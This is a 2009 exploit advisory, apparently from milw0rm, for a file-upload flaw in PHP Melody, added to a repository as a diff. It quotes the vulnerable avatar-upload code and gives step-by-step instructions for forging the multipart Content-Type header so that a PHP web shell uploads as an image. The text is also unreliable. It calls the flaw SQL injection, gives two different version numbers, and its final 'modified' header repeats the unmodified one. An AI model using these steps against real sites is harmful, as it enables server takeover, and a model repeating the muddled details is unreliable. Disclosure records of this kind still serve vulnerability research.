@@ -1,0 +1,90 @@
+---------------------------------------------------
+PHP Melody 1.5.3 remote injection upload file
+---------------------------------------------------
+ ###################################################
+ [+] Author        :  Chip D3 Bi0s
+ [+] Email         :  chipdebios[alt+64]gmail.com
+ [+] Group         :  LatinHackTeam
+ [+] Vulnerability :  SQL injection
+ ###################################################
+
+---------info Cms----------------
+name     : PHP Melody version 1.5.2
+email    : support@phpsugar.com
+dowloand : http://www.phpsugar.com
+web      : http://www.phpsugar.com
+price    : $39 USD
+---------------------------------
+
+
+File: Upload_avatar.php
+
+37. if(preg_match("/.jpg/i", "$filein"))
+38.   {
+39.       $format = 'image/jpeg';
+40.   }
+41.   if (preg_match("/.gif/i", "$filein"))
+42.   {
+43.       $format = 'image/gif';
+44.   }
+45.   if(preg_match("/.png/i", "$filein"))
+46.   {
+47.       $format = 'image/png';
+48.   }
+49.	  switch($format)
+50.       {
+51.           case 'image/jpeg':
+52.           $image = imagecreatefromjpeg($filein);
+53.           break;
+54.           case 'image/gif';
+55.           $image = imagecreatefromgif($filein);
+56.           break;
+57.           case 'image/png':
+58.           $image = imagecreatefrompng($filein);
+59.           break;
+60.       }
+------------
+136.  $url = $_FILES['imagefile']['name'];   // Set $url To Equal The Filename For Later Use 
+137.  if ($_FILES['imagefile']['type'] == "image/png" || $_FILES['imagefile']['type'] == "image/gif" || $_FILES['imagefile']['type'] == "image/jpg" || $_FILES['imagefile']['type'] == "image/jpeg" || $_FILES['imagefile']['type'] == "image/pjpeg") { 
+138.    $file_ext = strrchr($_FILES['imagefile']['name'], '.');   // Get The File Extention In The Format Of , For Instance, .jpg, .gif or .php 
+
+--------------------------------	
+explanation:
+	
+according to the code it does is see if the http, it is
+'image/jpeg';'image/gif';'image/png';	
+If not upload
+
+how to exploit:
+you must first register
+then upload the avatar you ever so upload_avatar.php
+there will have to change the header
+
+
+header with a proper imagen.gif looks like
+
+-----------------------------191691572411478\r\n
+Content-Disposition: form-data; name="imagefile"; filename="imagen.gif"\r\n
+Content-Type: image/gif\r\n\r\n
+
+the header when you upload a shell.php looks like
+
+-----------------------------191691572411478\r\n
+Content-Disposition: form-data; name="imagefile"; filename="shell.php"\r\n
+Content-Type: application/octet-stream\r\n\r\n
+
+	
+then just change it and let q and so can upload *. php
+
+-----------------------------191691572411478\r\n
+Content-Disposition: form-data; name="imagefile"; filename="shell.php"\r\n
+Content-Type: application/octet-stream\r\n\r\n
+
+
+
+Special greetings to my brother d4ng3r  ;) 
++++++++++++++++++++++++++++++++++
+[!] Produced in South America
+---------------------------------
+
+# milw0rm.com [2009-07-23]
